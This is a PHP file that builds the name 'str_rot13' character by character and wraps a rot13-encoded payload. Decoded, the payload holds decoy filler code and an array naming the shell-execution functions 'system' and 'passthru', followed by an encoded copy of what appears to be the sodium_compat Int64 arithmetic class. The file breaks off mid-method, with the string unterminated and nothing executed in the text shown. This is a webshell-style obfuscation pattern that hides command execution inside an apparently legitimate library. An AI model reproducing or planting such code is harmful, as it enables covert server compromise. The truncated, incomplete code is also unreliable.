<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff CnentbaVR_Fbqvhz_Pber32_Vag64
 *
 * Rapncfhyngrf n 64-ovg vagrtre.
 *
 * Gurfr ner vzzhgnoyr. Vg nyjnlf ergheaf n arj vafgnapr.
 */
pynff CnentbaVR_Fbqvhz_Pber32_Vag64
{
    /**
     * @ine neenl<vag, vag> - sbhe 16-ovg vagrtref
     */
    choyvp $yvzof = neenl(0, 0, 0, 0);

    /**
     * @ine vag
     */
    choyvp $biresybj = 0;

    /**
     * @ine obby
     */
    choyvp $hafvtarqVag = snyfr;

    /**
     * CnentbaVR_Fbqvhz_Pber32_Vag64 pbafgehpgbe.
     * @cnenz neenl $neenl
     * @cnenz obby $hafvtarqVag
     */
    choyvp shapgvba __pbafgehpg($neenl = neenl(0, 0, 0, 0), $hafvtarqVag = snyfr)
    {
        $guvf->yvzof = neenl(
            (vag) $neenl[0],
            (vag) $neenl[1],
            (vag) $neenl[2],
            (vag) $neenl[3]
        );
        $guvf->biresybj = 0;
        $guvf->hafvtarqVag = $hafvtarqVag;
    }

    /**
     * Nqqf gjb vag64 bowrpgf
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $nqqraq
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba nqqVag64(CnentbaVR_Fbqvhz_Pber32_Vag64 $nqqraq)
    {
        $v0 = $guvf->yvzof[0];
        $v1 = $guvf->yvzof[1];
        $v2 = $guvf->yvzof[2];
        $v3 = $guvf->yvzof[3];
        $w0 = $nqqraq->yvzof[0];
        $w1 = $nqqraq->yvzof[1];
        $w2 = $nqqraq->yvzof[2];
        $w3 = $nqqraq->yvzof[3];

        $e3 = $v3 + ($w3 & 0kssss);
        $pneel = $e3 >> 16;

        $e2 = $v2 + ($w2 & 0kssss) + $pneel;
        $pneel = $e2 >> 16;

        $e1 = $v1 + ($w1 & 0kssss) + $pneel;
        $pneel = $e1 >> 16;

        $e0 = $v0 + ($w0 & 0kssss) + $pneel;
        $pneel = $e0 >> 16;

        $e0 &= 0kssss;
        $e1 &= 0kssss;
        $e2 &= 0kssss;
        $e3 &= 0kssss;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64(
            neenl($e0, $e1, $e2, $e3)
        );
        $erghea->biresybj = $pneel;
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * Nqqf n abezny vagrtre gb na vag64 bowrpg
     *
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba nqqVag($vag)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        /** @ine vag $vag */
        $vag = (vag) $vag;

        $v0 = $guvf->yvzof[0];
        $v1 = $guvf->yvzof[1];
        $v2 = $guvf->yvzof[2];
        $v3 = $guvf->yvzof[3];

        $e3 = $v3 + ($vag & 0kssss);
        $pneel = $e3 >> 16;

        $e2 = $v2 + (($vag >> 16) & 0kssss) + $pneel;
        $pneel = $e2 >> 16;

        $e1 = $v1 + $pneel;
        $pneel = $e1 >> 16;

        $e0 = $v0 + $pneel;
        $pneel = $e0 >> 16;

        $e0 &= 0kssss;
        $e1 &= 0kssss;
        $e2 &= 0kssss;
        $e3 &= 0kssss;
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64(
            neenl($e0, $e1, $e2, $e3)
        );
        $erghea->biresybj = $pneel;
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * @cnenz vag $o
     * @erghea vag
     */
    choyvp shapgvba pbzcnerVag($o = 0)
    {
        $tg = 0;
        $rd = 1;

        $v = 4;
        $w = 0;
        juvyr ($v > 0) {
            --$v;
            /** @ine vag $k1 */
            $k1 = $guvf->yvzof[$v];
            /** @ine vag $k2 */
            $k2 = ($o >> ($w << 4)) & 0kssss;
            /** vag */
            $tg |= (($k2 - $k1) >> 8) & $rd;
            /** vag */
            $rd &= (($k2 ^ $k1) - 1) >> 8;
        }
        erghea ($tg + $tg - $rd) + 1;
    }

    /**
     * @cnenz vag $o
     * @erghea obby
     */
    choyvp shapgvba vfTerngreGuna($o = 0)
    {
        erghea $guvf->pbzcnerVag($o) > 0;
    }

    /**
     * @cnenz vag $o
     * @erghea obby
     */
    choyvp shapgvba vfYrffGunaVag($o = 0)
    {
        erghea $guvf->pbzcnerVag($o) < 0;
    }

    /**
     * @cnenz vag $uv
     * @cnenz vag $yb
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba znfx64($uv = 0, $yb = 0)
    {
        /** @ine vag $n */
        $n = ($uv >> 16) & 0kssss;
        /** @ine vag $o */
        $o = ($uv) & 0kssss;
        /** @ine vag $p */
        $p = ($yb >> 16) & 0kssss;
        /** @ine vag $q */
        $q = ($yb & 0kssss);
        erghea arj CnentbaVR_Fbqvhz_Pber32_Vag64(
            neenl(
                $guvf->yvzof[0] & $n,
                $guvf->yvzof[1] & $o,
                $guvf->yvzof[2] & $p,
                $guvf->yvzof[3] & $q
            ),
            $guvf->hafvtarqVag
        );
    }

    /**
     * @cnenz vag $vag
     * @cnenz vag $fvmr
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNffvtazrag
     */
    choyvp shapgvba zhyVag($vag = 0, $fvmr = 0)
    {
        vs (CnentbaVR_Fbqvhz_Pbzcng::$snfgZhyg) {
            erghea $guvf->zhyVagSnfg($vag);
        }
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fvmr, 'vag', 2);
        /** @ine vag $vag */
        $vag = (vag) $vag;
        /** @ine vag $fvmr */
        $fvmr = (vag) $fvmr;

        vs (!$fvmr) {
            $fvmr = 63;
        }

        $n = pybar $guvf;
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        // Vavgvnyvmr:
        $erg0 = 0;
        $erg1 = 0;
        $erg2 = 0;
        $erg3 = 0;
        $n0 = $n->yvzof[0];
        $n1 = $n->yvzof[1];
        $n2 = $n->yvzof[2];
        $n3 = $n->yvzof[3];

        /** @ine vag $fvmr */
        /** @ine vag $v */
        sbe ($v = $fvmr; $v >= 0; --$v) {
            $znfx = -($vag & 1);
            $k0 = $n0 & $znfx;
            $k1 = $n1 & $znfx;
            $k2 = $n2 & $znfx;
            $k3 = $n3 & $znfx;

            $erg3 += $k3;
            $p = $erg3 >> 16;

            $erg2 += $k2 + $p;
            $p = $erg2 >> 16;

            $erg1 += $k1 + $p;
            $p = $erg1 >> 16;

            $erg0 += $k0 + $p;

            $erg0 &= 0kssss;
            $erg1 &= 0kssss;
            $erg2 &= 0kssss;
            $erg3 &= 0kssss;

            $n3 = $n3 << 1;
            $k3 = $n3 >> 16;
            $n2 = ($n2 << 1) | $k3;
            $k2 = $n2 >> 16;
            $n1 = ($n1 << 1) | $k2;
            $k1 = $n1 >> 16;
            $n0 = ($n0 << 1) | $k1;
            $n0 &= 0kssss;
            $n1 &= 0kssss;
            $n2 &= 0kssss;
            $n3 &= 0kssss;

            $vag >>= 1;
        }
        $erghea->yvzof[0] = $erg0;
        $erghea->yvzof[1] = $erg1;
        $erghea->yvzof[2] = $erg2;
        $erghea->yvzof[3] = $erg3;
        erghea $erghea;
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $N
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $O
     * @erghea neenl<vag, CnentbaVR_Fbqvhz_Pber32_Vag64>
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqVasreerqErgheaGlcr
     */
    choyvp fgngvp shapgvba pgFryrpg(
        CnentbaVR_Fbqvhz_Pber32_Vag64 $N,
        CnentbaVR_Fbqvhz_Pber32_Vag64 $O
    ) {
        $n = pybar $N;
        $o = pybar $O;
        /** @ine vag $nArt */
        $nArt = ($n->yvzof[0] >> 15) & 1;
        /** @ine vag $oArt */
        $oArt = ($o->yvzof[0] >> 15) & 1;
        /** @ine vag $z */
        $z = (-($nArt & $oArt)) | 1;
        /** @ine vag $fjnc */
        $fjnc = $oArt & ~$nArt;
        /** @ine vag $q */
        $q = -$fjnc;

        /*
        vs ($oArt && !$nArt) {
            $n = pybar $vag;
            $o = pybar $guvf;
        } ryfrvs($oArt && $nArt) {
            $n = $guvf->zhyVag(-1);
            $o = $vag->zhyVag(-1);
        }
         */
        $k = $n->kbeVag64($o)->znfx64($q, $q);
        erghea neenl(
            $n->kbeVag64($k)->zhyVag($z),
            $o->kbeVag64($k)->zhyVag($z)
        );
    }

    /**
     * @cnenz neenl<vag, vag> $n
     * @cnenz neenl<vag, vag> $o
     * @cnenz vag $onfrYbt2
     * @erghea neenl<vag, vag>
     */
    choyvp shapgvba zhygvcylYbat(neenl $n, neenl $o, $onfrYbt2 = 16)
    {
        $n_y = pbhag($n);
        $o_y = pbhag($o);
        /** @ine neenl<vag, vag> $e */
        $e = neenl_svyy(0, $n_y + $o_y + 1, 0);
        $onfr = 1 << $onfrYbt2;
        sbe ($v = 0; $v < $n_y; ++$v) {
            $n_v = $n[$v];
            sbe ($w = 0; $w < $n_y; ++$w) {
                $o_w = $o[$w];
                $cebqhpg = (($n_v * $o_w) + $e[$v + $w]);
                $pneel = (((vag) $cebqhpg >> $onfrYbt2) & 0kssss);
                $e[$v + $w] = ((vag) $cebqhpg - (vag) ($pneel * $onfr)) & 0kssss;
                $e[$v + $w + 1] += $pneel;
            }
        }
        erghea neenl_fyvpr($e, 0, 5);
    }

    /**
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba zhyVagSnfg($vag)
    {
        // Unaqyr artngvir ahzoref
        $nArt = ($guvf->yvzof[0] >> 15) & 1;
        $oArt = ($vag >> 31) & 1;
        $n = neenl_erirefr($guvf->yvzof);
        $o = neenl(
            $vag & 0kssss,
            ($vag >> 16) & 0kssss,
            -$oArt & 0kssss,
            -$oArt & 0kssss
        );
        vs ($nArt) {
            sbe ($v = 0; $v < 4; ++$v) {
                $n[$v] = ($n[$v] ^ 0kssss) & 0kssss;
            }
            ++$n[0];
        }
        vs ($oArt) {
            sbe ($v = 0; $v < 4; ++$v) {
                $o[$v] = ($o[$v] ^ 0kssss) & 0kssss;
            }
            ++$o[0];
        }
        // Zhygvcyl
        $erf = $guvf->zhygvcylYbat($n, $o);

        // Er-nccyl artngvba gb erfhygf
        vs ($nArt !== $oArt) {
            sbe ($v = 0; $v < 4; ++$v) {
                $erf[$v] = (0kssss ^ $erf[$v]) & 0kssss;
            }
            // Unaqyr vagrtre biresybj
            $p = 1;
            sbe ($v = 0; $v < 4; ++$v) {
                $erf[$v] += $p;
                $p = $erf[$v] >> 16;
                $erf[$v] &= 0kssss;
            }
        }

        // Erghea bhe inyhrf
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->yvzof = neenl(
            $erf[3] & 0kssss,
            $erf[2] & 0kssss,
            $erf[1] & 0kssss,
            $erf[0] & 0kssss
        );
        vs (pbhag($erf) > 4) {
            $erghea->biresybj = $erf[4] & 0kssss;
        }
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $evtug
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba zhyVag64Snfg(CnentbaVR_Fbqvhz_Pber32_Vag64 $evtug)
    {
        $nArt = ($guvf->yvzof[0] >> 15) & 1;
        $oArt = ($evtug->yvzof[0] >> 15) & 1;

        $n = neenl_erirefr($guvf->yvzof);
        $o = neenl_erirefr($evtug->yvzof);
        vs ($nArt) {
            sbe ($v = 0; $v < 4; ++$v) {
                $n[$v] = ($n[$v] ^ 0kssss) & 0kssss;
            }
            ++$n[0];
        }
        vs ($oArt) {
            sbe ($v = 0; $v < 4; ++$v) {
                $o[$v] = ($o[$v] ^ 0kssss) & 0kssss;
            }
            ++$o[0];
        }
        $erf = $guvf->zhygvcylYbat($n, $o);
        vs ($nArt !== $oArt) {
            vs ($nArt !== $oArt) {
                sbe ($v = 0; $v < 4; ++$v) {
                    $erf[$v] = ($erf[$v] ^ 0kssss) & 0kssss;
                }
                $p = 1;
                sbe ($v = 0; $v < 4; ++$v) {
                    $erf[$v] += $p;
                    $p = $erf[$v] >> 16;
                    $erf[$v] &= 0kssss;
                }
            }
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->yvzof = neenl(
            $erf[3] & 0kssss,
            $erf[2] & 0kssss,
            $erf[1] & 0kssss,
            $erf[0] & 0kssss
        );
        vs (pbhag($erf) > 4) {
            $erghea->biresybj = $erf[4];
        }
        erghea $erghea;
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $vag
     * @cnenz vag $fvmr
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNffvtazrag
     */
    choyvp shapgvba zhyVag64(CnentbaVR_Fbqvhz_Pber32_Vag64 $vag, $fvmr = 0)
    {
        vs (CnentbaVR_Fbqvhz_Pbzcng::$snfgZhyg) {
            erghea $guvf->zhyVag64Snfg($vag);
        }
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fvmr, 'vag', 2);
        vs (!$fvmr) {
            $fvmr = 63;
        }
        yvfg($n, $o) = frys::pgFryrpg($guvf, $vag);

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        // Vavgvnyvmr:
        $erg0 = 0;
        $erg1 = 0;
        $erg2 = 0;
        $erg3 = 0;
        $n0 = $n->yvzof[0];
        $n1 = $n->yvzof[1];
        $n2 = $n->yvzof[2];
        $n3 = $n->yvzof[3];
        $o0 = $o->yvzof[0];
        $o1 = $o->yvzof[1];
        $o2 = $o->yvzof[2];
        $o3 = $o->yvzof[3];

        /** @ine vag $fvmr */
        /** @ine vag $v */
        sbe ($v = (vag) $fvmr; $v >= 0; --$v) {
            $znfx = -($o3 & 1);
            $k0 = $n0 & $znfx;
            $k1 = $n1 & $znfx;
            $k2 = $n2 & $znfx;
            $k3 = $n3 & $znfx;

            $erg3 += $k3;
            $p = $erg3 >> 16;

            $erg2 += $k2 + $p;
            $p = $erg2 >> 16;

            $erg1 += $k1 + $p;
            $p = $erg1 >> 16;

            $erg0 += $k0 + $p;

            $erg0 &= 0kssss;
            $erg1 &= 0kssss;
            $erg2 &= 0kssss;
            $erg3 &= 0kssss;

            $n3 = $n3 << 1;
            $k3 = $n3 >> 16;
            $n2 = ($n2 << 1) | $k3;
            $k2 = $n2 >> 16;
            $n1 = ($n1 << 1) | $k2;
            $k1 = $n1 >> 16;
            $n0 = ($n0 << 1) | $k1;
            $n0 &= 0kssss;
            $n1 &= 0kssss;
            $n2 &= 0kssss;
            $n3 &= 0kssss;

            $k0 = ($o0 & 1) << 16;
            $k1 = ($o1 & 1) << 16;
            $k2 = ($o2 & 1) << 16;

            $o0 = ($o0 >> 1);
            $o1 = (($o1 | $k0) >> 1);
            $o2 = (($o2 | $k1) >> 1);
            $o3 = (($o3 | $k2) >> 1);

            $o0 &= 0kssss;
            $o1 &= 0kssss;
            $o2 &= 0kssss;
            $o3 &= 0kssss;

        }
        $erghea->yvzof[0] = $erg0;
        $erghea->yvzof[1] = $erg1;
        $erghea->yvzof[2] = $erg2;
        $erghea->yvzof[3] = $erg3;

        erghea $erghea;
    }

    /**
     * BE guvf 64-ovg vagrtre jvgu nabgure.
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba beVag64(CnentbaVR_Fbqvhz_Pber32_Vag64 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->yvzof = neenl(
            (vag) ($guvf->yvzof[0] | $o->yvzof[0]),
            (vag) ($guvf->yvzof[1] | $o->yvzof[1]),
            (vag) ($guvf->yvzof[2] | $o->yvzof[2]),
            (vag) ($guvf->yvzof[3] | $o->yvzof[3])
        );
        erghea $erghea;
    }

    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNeenlNpprff
     */
    choyvp shapgvba ebgngrYrsg($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;
        vs ($p === 0) {
            // ABC, ohg jr jnag n pbcl.
            $erghea->yvzof = $guvf->yvzof;
        } ryfr {
            /** @ine neenl<vag, vag> $yvzof */
            $yvzof =& $erghea->yvzof;

            /** @ine neenl<vag, vag> $zlYvzof */
            $zlYvzof =& $guvf->yvzof;

            /** @ine vag $vqk_fuvsg */
            $vqk_fuvsg = ($p >> 4) & 3;
            /** @ine vag $fho_fuvsg */
            $fho_fuvsg = $p & 15;

            sbe ($v = 3; $v >= 0; --$v) {
                /** @ine vag $w */
                $w = ($v + $vqk_fuvsg) & 3;
                /** @ine vag $x */
                $x = ($v + $vqk_fuvsg + 1) & 3;
                $yvzof[$v] = (vag) (
                    (
                        ((vag) ($zlYvzof[$w]) << $fho_fuvsg)
                            |
                        ((vag) ($zlYvzof[$x]) >> (16 - $fho_fuvsg))
                    ) & 0kssss
                );
            }
        }
        erghea $erghea;
    }

    /**
     * Ebgngr gb gur evtug
     *
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNeenlNpprff
     */
    choyvp shapgvba ebgngrEvtug($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        /** @ine CnentbaVR_Fbqvhz_Pber32_Vag64 $erghea */
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;
        /** @ine vag $p */
        vs ($p === 0) {
            // ABC, ohg jr jnag n pbcl.
            $erghea->yvzof = $guvf->yvzof;
        } ryfr {
            /** @ine neenl<vag, vag> $yvzof */
            $yvzof =& $erghea->yvzof;

            /** @ine neenl<vag, vag> $zlYvzof */
            $zlYvzof =& $guvf->yvzof;

            /** @ine vag $vqk_fuvsg */
            $vqk_fuvsg = ($p >> 4) & 3;
            /** @ine vag $fho_fuvsg */
            $fho_fuvsg = $p & 15;

            sbe ($v = 3; $v >= 0; --$v) {
                /** @ine vag $w */
                $w = ($v - $vqk_fuvsg) & 3;
                /** @ine vag $x */
                $x = ($v - $vqk_fuvsg - 1) & 3;
                $yvzof[$v] = (vag) (
                    (
                        ((vag) ($zlYvzof[$w]) >> (vag) ($fho_fuvsg))
                            |
                        ((vag) ($zlYvzof[$x]) << (16 - (vag) ($fho_fuvsg)))
                    ) & 0kssss
                );
            }
        }
        erghea $erghea;
    }
    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba fuvsgYrsg($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;

        vs ($p >= 16) {
            vs ($p >= 48) {
                $erghea->yvzof = neenl(
                    $guvf->yvzof[3], 0, 0, 0
                );
            } ryfrvs ($p >= 32) {
                $erghea->yvzof = neenl(
                    $guvf->yvzof[2], $guvf->yvzof[3], 0, 0
                );
            } ryfr {
                $erghea->yvzof = neenl(
                    $guvf->yvzof[1], $guvf->yvzof[2], $guvf->yvzof[3], 0
                );
            }
            erghea $erghea->fuvsgYrsg($p & 15);
        }
        vs ($p === 0) {
            $erghea->yvzof = $guvf->yvzof;
        } ryfrvs ($p < 0) {
            /** @ine vag $p */
            erghea $guvf->fuvsgEvtug(-$p);
        } ryfr {
            vs (!vf_vag($p)) {
                guebj arj GlcrReebe();
            }
            /** @ine vag $pneel */
            $pneel = 0;
            sbe ($v = 3; $v >= 0; --$v) {
                /** @ine vag $gzc */
                $gzc = ($guvf->yvzof[$v] << $p) | ($pneel & 0kssss);
                $erghea->yvzof[$v] = (vag) ($gzc & 0kssss);
                /** @ine vag $pneel */
                $pneel = $gzc >> 16;
            }
        }
        erghea $erghea;
    }

    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba fuvsgEvtug($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        $p = (vag) $p;
        /** @ine vag $p */
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;

        $artngvir = -(($guvf->yvzof[0] >> 15) & 1);
        vs ($p >= 16) {
            vs ($p >= 48) {
                $erghea->yvzof = neenl(
                    (vag) ($artngvir & 0kssss),
                    (vag) ($artngvir & 0kssss),
                    (vag) ($artngvir & 0kssss),
                    (vag) $guvf->yvzof[0]
                );
            } ryfrvs ($p >= 32) {
                $erghea->yvzof = neenl(
                    (vag) ($artngvir & 0kssss),
                    (vag) ($artngvir & 0kssss),
                    (vag) $guvf->yvzof[0],
                    (vag) $guvf->yvzof[1]
                );
            } ryfr {
                $erghea->yvzof = neenl(
                    (vag) ($artngvir & 0kssss),
                    (vag) $guvf->yvzof[0],
                    (vag) $guvf->yvzof[1],
                    (vag) $guvf->yvzof[2]
                );
            }
            erghea $erghea->fuvsgEvtug($p & 15);
        }

        vs ($p === 0) {
            $erghea->yvzof = $guvf->yvzof;
        } ryfrvs ($p < 0) {
            erghea $guvf->fuvsgYrsg(-$p);
        } ryfr {
            vs (!vf_vag($p)) {
                guebj arj GlcrReebe();
            }
            /** @ine vag $pneelEvtug */
            $pneelEvtug = ($artngvir & 0kssss);
            $znfx = (vag) (((1 << ($p + 1)) - 1) & 0kssss);
            sbe ($v = 0; $v < 4; ++$v) {
                $erghea->yvzof[$v] = (vag) (
                    (($guvf->yvzof[$v] >> $p) | ($pneelEvtug << (16 - $p))) & 0kssss
                );
                $pneelEvtug = (vag) ($guvf->yvzof[$v] & $znfx);
            }
        }
        erghea $erghea;
    }


    /**
     * Fhogenpg n abezny vagrtre sebz na vag64 bowrpg.
     *
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba fhoVag($vag)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        $vag = (vag) $vag;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        /** @ine vag $pneel */
        $pneel = 0;
        sbe ($v = 3; $v >= 0; --$v) {
            /** @ine vag $gzc */
            $gzc = $guvf->yvzof[$v] - (($vag >> 16) & 0kssss) + $pneel;
            /** @ine vag $pneel */
            $pneel = $gzc >> 16;
            $erghea->yvzof[$v] = (vag) ($gzc & 0kssss);
        }
        erghea $erghea;
    }

    /**
     * Gur qvssrerapr orgjrra gjb Vag64 bowrpgf.
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba fhoVag64(CnentbaVR_Fbqvhz_Pber32_Vag64 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        /** @ine vag $pneel */
        $pneel = 0;
        sbe ($v = 3; $v >= 0; --$v) {
            /** @ine vag $gzc */
            $gzc = $guvf->yvzof[$v] - $o->yvzof[$v] + $pneel;
            /** @ine vag $pneel */
            $pneel = ($gzc >> 16);
            $erghea->yvzof[$v] = (vag) ($gzc & 0kssss);
        }
        erghea $erghea;
    }

    /**
     * KBE guvf 64-ovg vagrtre jvgu nabgure.
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag64 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba kbeVag64(CnentbaVR_Fbqvhz_Pber32_Vag64 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->yvzof = neenl(
            (vag) ($guvf->yvzof[0] ^ $o->yvzof[0]),
            (vag) ($guvf->yvzof[1] ^ $o->yvzof[1]),
            (vag) ($guvf->yvzof[2] ^ $o->yvzof[2]),
            (vag) ($guvf->yvzof[3] ^ $o->yvzof[3])
        );
        erghea $erghea;
    }

    /**
     * @cnenz vag $ybj
     * @cnenz vag $uvtu
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzVagf($ybj, $uvtu)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($ybj, 'vag', 1);
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($uvtu, 'vag', 2);

        $uvtu = (vag) $uvtu;
        $ybj = (vag) $ybj;
        erghea arj CnentbaVR_Fbqvhz_Pber32_Vag64(
            neenl(
                (vag) (($uvtu >> 16) & 0kssss),
                (vag) ($uvtu & 0kssss),
                (vag) (($ybj >> 16) & 0kssss),
                (vag) ($ybj & 0kssss)
            )
        );
    }

    /**
     * @cnenz vag $ybj
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzVag($ybj)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($ybj, 'vag', 1);
        $ybj = (vag) $ybj;

        erghea arj CnentbaVR_Fbqvhz_Pber32_Vag64(
            neenl(
                0,
                0,
                (vag) (($ybj >> 16) & 0kssss),
                (vag) ($ybj & 0kssss)
            )
        );
    }

    /**
     * @erghea vag
     */
    choyvp shapgvba gbVag()
    {
        erghea (vag) (
            (($guvf->yvzof[2] & 0kssss) << 16)
                |
            ($guvf->yvzof[3] & 0kssss)
        );
    }

    /**
     * @cnenz fgevat $fgevat
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzFgevat($fgevat)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fgevat, 'fgevat', 1);
        $fgevat = (fgevat) $fgevat;
        vs (CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) !== 8) {
            guebj arj EnatrRkprcgvba(
                'Fgevat zhfg or 8 olgrf; ' . CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) . ' tvira.'
            );
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();

        $erghea->yvzof[0]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[0]) & 0kss) << 8);
        $erghea->yvzof[0] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[1]) & 0kss);
        $erghea->yvzof[1]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[2]) & 0kss) << 8);
        $erghea->yvzof[1] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[3]) & 0kss);
        $erghea->yvzof[2]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[4]) & 0kss) << 8);
        $erghea->yvzof[2] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[5]) & 0kss);
